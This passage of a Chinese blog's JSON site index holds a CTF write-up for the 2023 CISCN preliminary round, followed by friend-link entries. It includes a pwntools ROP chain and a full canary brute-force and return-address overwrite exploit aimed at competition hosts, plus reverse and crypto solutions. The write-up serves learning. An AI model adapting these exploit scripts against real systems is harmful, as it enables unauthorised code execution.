ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000402404) # syscall taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.sendline(p) taolve.interactive() pwn-funcanary # from pwn import * import struct is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) # canary的最后一个字节固定为\\x00 canary = b\u0026#39;\\x00\u0026#39; # 检验我们填充的 padding 的长度是否正确 taolve.send(b\u0026#39;a\u0026#39; * 104 + canary) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;have fun\\n\u0026#39; in a: print(\u0026#34;ok\u0026#34;) # 拖到ida查看，可以看到fork函数， # fork函数相当于是在不断的进行一个自我复制，所以每一次复制出来的程序的canary值也是一样。 # 我们可以进行一个逐位的爆破，如果程序异常退出没有打印“have fun”，就说明这一位不对， # 如果程序正常，打印了“have fun”，就可以接着跑下一位 # 所以我们循环7次来爆破出canary的前7位字节 for j in range(7): for i in range(0x100): taolve.send(b\u0026#39;a\u0026#39; * 104 + canary + struct.pack(\u0026#39;B\u0026#39;, i)) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;have fun\\n\u0026#39; in a: canary += struct.pack(\u0026#39;B\u0026#39;, i) break print(\u0026#34;canary \u0026#34;.encode(\u0026#39;utf-8\u0026#39;) + canary) # ida 上可以看到后门函数的地址是0x01229 # 程序开了PIE保护，不过最后三位的地址时不变的 # 所以我们覆盖返回地址时可以直接覆盖第一个十六进制位为\\x31, # 而第二个十六进制位则可以采用爆破的方式 backdoor = b\u0026#34;\\x31\u0026#34; for j in range(1): for i in range(0x100): backdoor1 = backdoor + struct.pack(\u0026#39;B\u0026#39;, i) payload = b\u0026#39;a\u0026#39; * 104 + canary + b\u0026#39;a\u0026#39; * 8 + backdoor1 taolve.send(payload) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;flag\u0026#39; in a: # 当接收到flag字符串时程序停止 pause() taolve.interactive() reverse-babyre # 先在网站打开题目发过来的xml项目，看到代码块，将代码块翻译成c++代码\n#include\u0026lt;iostream\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;int\u0026gt;secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; string flag; vector\u0026lt;int\u0026gt;test; cin \u0026gt;\u0026gt; flag; for (int i = 0; i \u0026lt; flag.length(); i++) { int tmp; if (i == 0) { tmp = (int)flag[i] ^ 0; } else { tmp = (int)flag[i] ^ (int)flag[i - 1]; } test.push_back(tmp); } if (test.size() == secret.size()) { bool is_ok = true; for (int i = 0; i \u0026lt; test.size(); i++) { int item = test[i]; int b = secret[i]; if (item\u0026lt;b || item\u0026gt;b) { is_ok = false; } } if (is_ok) { cout \u0026lt;\u0026lt; \u0026#34;well done!\u0026#34;; } } return 0; } 对应写出re脚本\n#include\u0026lt;iostream\u0026gt; #include\u0026lt;vector\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; string flagchars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{}\u0026#34;; int main() { vector\u0026lt;int\u0026gt;secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; string flag; vector\u0026lt;int\u0026gt;test; int index = 0; for (int i = 0; i \u0026lt; secret.size(); i++) { for(int j = 0;j\u0026lt;flagchars.size();j++){ int tmp = 0; if (index == 0) { tmp = int(flagchars[j]) ^ 0; } else { tmp = int(flagchars[j]) ^ flag[index - 1]; } if (tmp == secret[index]) { flag += flagchars[j]; index++; break; } } } cout \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; endl; return 0; } 运行脚本得到flag\nCrypto-基于国密SM2算法 # 直接照着文档一步一步的走即可，用到了两个在线网站：\nhttps://const.net.cn/tool/sm2/genkey/\n第一个网站用来生成SM2密钥 https://the-x.cn/cryptography/Sm2.aspx\n第二个网站用来在线加解密SM2算法和SM4算法\n先在在线网站 https://const.net.cn/tool/sm2/genkey/ 上生成SM2密钥： my_private_key F68AC4F1AEA7F95390B1B485661B9A226B701553A5BB6BD200079887B0C2BAF5 my_public key 97E2124611B1288B31B72DC1DAD447B52C4CA2F8FC546B2B6E8B8FD7F71D10AF60301DAFF296D1DE 1041E1739D4ED46423714230B1800723993E8E457D95BC28 然后全程跟着文档走： pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;name=my_name\u0026amp;school=my_school\u0026amp;phone=my_tel\u0026#34; http://39.106.48.123:35153/api/login { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; } } pwner@pwner-virtual-machine:~/CTF$curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026amp;publicKey=97E2124611B1288B31B72DC1DAD447B52C4CA2F8FC546B2B6E8B8FD7F71D10AF60301DAFF296D1DE1041E1739D4ED46423714230B1800723993E8E457D95BC28\u0026#34; http://39.106.48.123:35153/api/allkey { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;publicKey\u0026#34;: \u0026#34;041c6292afb7213ab575328f097fb55400be7fcc09e81cef3f61467603b566ab836e4ef4b72e697ce0a1e4d97c455a3f16fac7fef56c273a308dc042efe7dd2e4c\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;eaa50cc1302292a8b7930c81737af202cf646acc4998c55dec8912a0ec41e7eb\u0026#34;, \u0026#34;randomString\u0026#34;: \u0026#34;52ed9891b127e04726b0244ff388da3d61dfff8eb15c99ec6cf108d0a24429f23a63037ae215945d59720287e87703c2d95cf2a92099b22b02db08d292c1909c2c44e778efb0d8b765141444ee03e7f890b5bc9daa36c03d67abf97fe5d0563060fc557ccac0aae284a35232f007a62b\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; } pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; http://39.106.48.123:35153/api/quantumm { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34;, \u0026#34;quantumString\u0026#34;: \u0026#34;64b8fe642b52996eaa5ec41e9a2b170e4ef88d9c5090cb47b5131ff5ac734be544df579ef61e8664a24d1f0851152a092ea4f192a53593412cb298d2ccb40d4bfd9e9262eccf77fb79f0fcc4479b340ee9357e180a22c92912c6026e08dd23078e4a170e1a9683118dd74e470ce71034\u0026#34; } } pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026amp;quantumString=E05DF0B168B718EEE6F7B6D1D93ACE09\u0026#34; http://39.106.48.123:35153/api/check { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: \u0026#34;结果正确，请访问 /api/search获取您的 flag\u0026#34; } pwner@pwner-virtual-machine:~/桌面/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; http://39.106.48.123:35153/api/searchh { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;my_nmae\u0026#34;, \u0026#34;school\u0026#34;: \u0026#34;my_school\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;my_tel\u0026#34;, \u0026#34;publicKey\u0026#34;: \u0026#34;041c6292afb7213ab575328f097fb55400be7fcc09e81cef3f61467603b566ab836e4ef4b72e697ce0a1e4d97c455a3f16fac7fef56c273a308dc042efe7dd2e4c\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;d0b086d584bd7e8ec07bfe6e05074ca557dbfa3693cbdaf7d13705865fa05a4e\u0026#34;, \u0026#34;randomString\u0026#34;: \u0026#34;7faca1be2a892b48a539893fb0bf9b60\u0026#34;, \u0026#34;quantumStringServer\u0026#34;: \u0026#34;e05df0b168b718eee6f7b6d1d93ace09\u0026#34;, \u0026#34;quantumStringUser\u0026#34;: \u0026#34;E05DF0B168B718EEE6F7B6D1D93ACE09\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;已完成考题，结果正确:flag{51035652-8117-44a0-9830-25ba73503def}\u0026#34; } }pwner@pwner-virtual-machine:~/CTF$ Crypto-Sign_in_passwd # flag文件里有两行字符串，\nj2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D\nGHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5\n观察后推测第一行是类似base64编码后的密文， 第二行有 “%”，推测是进行了url编码\n第一行字符串不能直接用欧通的base64解码，也不能用base91、base92等，\n而第二行url解码之后是：\nGHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5 可以看这一个字符串是base64码表的乱序，\n推测是以第二行字符串为新的码表来对第一行进行解码得到flag\n由于“=”号在码表中间，所以把最后面的5当作是原来的“=”号，\n可以直接自己写一个base64解码脚本，也可以直接上网搜base64解码脚本再修改码表\n# 改变后的码表 s = \u0026#34;GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF\u0026#34; def base64_changed_decode(inputs): # 将字符串转化为2进制 bin_str = [] for i in inputs: if i != \u0026#39;5\u0026#39;: x = str(bin(s.index(i))).replace(\u0026#39;0b\u0026#39;, \u0026#39;\u0026#39;) bin_str.append(\u0026#39;{:0\u0026gt;6}\u0026#39;.format(x)) # print(bin_str) # 输出的字符串 outputs = \u0026#34;\u0026#34; nums = inputs.count(\u0026#39;=\u0026#39;) while bin_str: temp_list = bin_str[:4] temp_str = \u0026#34;\u0026#34;.join(temp_list) # print(temp_str) # 补足8位字节 if (len(temp_str) % 8 != 0): temp_str = temp_str[0:-1 * nums * 2] # 将四个6字节的二进制转换为三个字符 for i in range(0, int(len(temp_str) / 8)): outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2)) bin_str = bin_str[4:] print(\u0026#34;Decrypted String:\\n%s \u0026#34; % outputs) input_str = input(\u0026#34;Please enter a string that needs to be decrypted: \\n\u0026#34;) base64_changed_decode(input_str) \u0026#34;\u0026#34;\u0026#34; 输出： Please enter a string that needs to be decrypted: j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D Decrypted String: flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4} \u0026#34;\u0026#34;\u0026#34; ","date":"June 30, 2023","permalink":"/posts/wp/2023_06_ciscn/","section":"Posts","summary":"以下为2023信安国赛初赛的pwn，reverse和Cryp","title":"2023 ciscn 初赛"},{"content":"冥冥之中 自有天意\n","date":"June 25, 2023","permalink":"/link/yring/","section":"友链/links","summary":"\u003cp\u003e冥冥之中 自有天意\u003c/p\u003e","title":"yring"},{"content":"写一些和我一样菜也能看懂的文章\n","date":"June 24, 2023","permalink":"/link/weyung/","section":"友链/links","summary":"\u003cp\u003e写一些和我一样菜也能看懂的文章\u003c/p\u003e","title":"weyung"},{"content":"歩いても、歩いても\n","date":"June 20, 2023","permalink":"/link/a39/","section":"友链/links","summary":"\u003cp\u003e\u003cstrong\u003e歩いても、歩いても\u003c/strong\u003e\u003c/p\u003e","title":"a39"},{"content":"Fear neither hardship nor darkness\n","date":"June 12, 2023","permalink":"/link/pazuris/","section":"友链/links","summary":"\u003cp\u003eFear neither hardship nor darkness\u003c/p\u003e","title":"Pazuris"},{"content":"Nothing really matters.\n","date":"June 11, 2023","permalink":"/link/r1ck/","section":"友链/links","summary":"\u003cp\u003eNothing really matters.\u003c/p\u003e","title":"R1ck"},{"content":"今日启程 无畏向前\n","date":"June 10, 2023","permalink":"/link/lilran/","section":"友链/links","summary":"\u003cp\u003e今日启程 无畏向前\u003c/p\u003e","title":"LilRan"},{"content":"","date":"January 1, 1","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"}]